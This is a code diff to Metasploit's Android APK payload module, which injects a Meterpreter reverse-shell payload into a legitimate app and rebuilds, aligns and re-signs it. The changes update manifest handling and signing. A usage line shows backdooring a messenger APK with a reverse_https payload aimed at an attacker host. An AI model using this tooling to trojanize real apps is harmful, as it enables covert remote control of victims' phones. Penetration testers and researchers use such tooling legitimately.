@@ -25,6 +25,7 @@ class Msf::Payload::Apk
     print_error "e.g. #{$0} -x messenger.apk -p android/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=8443\n"
   end
 
+  # Run a command and return the output 
   def run_cmd(cmd)
     begin
       stdin, stdout, stderr = Open3.popen3(*cmd)
@@ -145,11 +146,11 @@ class Msf::Payload::Apk
       raise RuntimeError, "Invalid template: #{apkfile}"
     end
 
-    apktool = run_cmd(%w[apktool -version])
+    apktool = run_cmd(%w[apktool version])
     unless apktool != nil
       raise RuntimeError, "apktool not found. If it's not in your PATH, please add it."
     end
-
+    
     apk_v = Rex::Version.new(apktool)
     unless apk_v >= Rex::Version.new('2.0.1')
       raise RuntimeError, "apktool version #{apk_v} not supported, please download at least version 2.0.1."
@@ -180,6 +181,12 @@ class Msf::Payload::Apk
         raise RuntimeError, "zipalign not found. If it's not in your PATH, please add it."
       end
 
+      xml2axml = run_cmd(['xml2axml'])
+      unless xml2axml != nil
+        raise RuntimeError, "xml2axml not found. If it's not in your PATH, please add it."
+      end
+
+
       keystore = "#{tempdir}/signing.keystore"
       storepass = "android"
       keypass = "android"
@@ -188,6 +195,8 @@ class Msf::Payload::Apk
       orig_cert_dname = orig_cert_data[0]
       orig_cert_startdate = orig_cert_data[1]
       orig_cert_validity = orig_cert_data[2]
+      get_minSDKv=`aapt list -a #{apkfile}|grep "minSdkVersion"|awk -F ")" '{print $NF}'|xargs printf %d`
+      minSDKv = get_minSDKv.to_s.gsub("\n", "")
 
       print_status "Creating signing key and keystore..\n"
       run_cmd([
@@ -197,18 +206,17 @@ class Msf::Payload::Apk
       ])
     end
 
-		###############################################################################################
+	###############################################################################################
     print_status "Decompiling original APK without decode resources..\n"
-    run_cmd(["apktool", "d", "-f", "-r", "-o", "#{temdir}/original", "#{tempdir}/original.apk"])
-    print_status("Ignoring the resource decompilation..")
-    run_cmd(["apktool", "d", "-f", "-o", "#{tempdir}/original_tmp", "#{tempdir}/original.apk"])
-    print_status "Recovering manifest file..\n"
-    FileUtils.rm_rf('original/AndroidManifest.xml')
-    FileUtils.cp Dir.glob('original_tmp/AndroidManifest.xml'), 'original/'
-    FileUtils.rm_rf('original_tmp')
+    run_cmd(["apktool", "d", "-f", "-r", "-o", "#{tempdir}/original", "#{tempdir}/original.apk"])
+    print_status("Decompiling AndroidManifest..")
+    FileUtils.cp Dir.glob("#{tempdir}/original/AndroidManifest.xml"), "#{tempdir}/"
+    FileUtils.rm_rf("#{tempdir}/original/AndroidManifest.xml")
+    run_cmd(['xml2axml', 'd', "#{tempdir}/AndroidManifest.xml", "#{tempdir}/original/AndroidManifest.xml"])
+    FileUtils.rm_rf("#{tempdir}/AndroidManifest.xml")
     print_status("Decompiling payload APK..")
     run_cmd(['apktool', 'd', '-f', '-o', "#{tempdir}/payload", "#{tempdir}/payload.apk"])
-		###############################################################################################
+	###############################################################################################
 
     amanifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
 
@@ -283,8 +291,16 @@ class Msf::Payload::Apk
       fix_manifest(tempdir, package, classes['MainService'], classes['MainBroadcastReceiver'])
     end
 
+    ##########################################################################################
+    print_status("Encoding AndroidManifest file..")
+    run_cmd(['xml2axml', 'e', "#{tempdir}/original/AndroidManifest.xml", "#{tempdir}/AndroidManifest.xml"])
+    FileUtils.rm_rf("#{tempdir}/original/AndroidManifest.xml")
+    FileUtils.cp Dir.glob("#{tempdir}/AndroidManifest.xml"), "#{tempdir}/original/"
+    FileUtils.rm_rf("#{tempdir}/AndroidManifest.xml")
+    ##########################################################################################
+
     print_status "Rebuilding apk with meterpreter injection as #{injected_apk}\n"
-    apktool_output = run_cmd(['apktool', 'b', '-o', injected_apk, "#{tempdir}/original"])
+    apktool_output = run_cmd(['apktool', 'b', '-f', "#{tempdir}/original", '-o', injected_apk])
     unless File.readable?(injected_apk)
       print_error apktool_output
       raise RuntimeError, "Unable to rebuild apk with apktool"
@@ -292,7 +308,8 @@ class Msf::Payload::Apk
 
     if signature
       print_status "Aligning #{injected_apk}\n"
-      zipalign_output = run_cmd(['zipalign', '-p', '4', injected_apk, aligned_apk])
+      # zipalign_output = run_cmd(['zipalign', '-p', '4', injected_apk, aligned_apk])
+      zipalign_output = run_cmd(['zipalign', '-f', '-v', '4', injected_apk, aligned_apk])
 
       unless File.readable?(aligned_apk)
         print_error(zipalign_output)
@@ -301,14 +318,19 @@ class Msf::Payload::Apk
 
       print_status "Signing #{aligned_apk} with apksigner\n"
       apksigner_output = run_cmd([
-        'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}", aligned_apk
+        'apksigner', 'sign', '--ks', keystore, '--ks-pass', "pass:#{storepass}",
+        '--ks-key-alias', keyalias, '--v3-signing-enabled', 'true', '--v4-signing-enabled', 'true',
+        '--min-sdk-version', "#{minSDKv}", aligned_apk
       ])
       if apksigner_output.to_s.include?('Failed')
         print_error(apksigner_output)
         raise RuntimeError, 'Signing with apksigner failed.'
       end
 
-      apksigner_verify = run_cmd(['apksigner', 'verify', '--verbose', aligned_apk])
+      apksigner_verify = run_cmd([
+        'apksigner', 'verify', '--verbose',
+        '--min-sdk-version', "#{minSDKv}", aligned_apk
+      ])
       if apksigner_verify.to_s.include?('DOES NOT VERIFY')
         print_error(apksigner_verify)
         raise RuntimeError, 'Signature verification failed.'
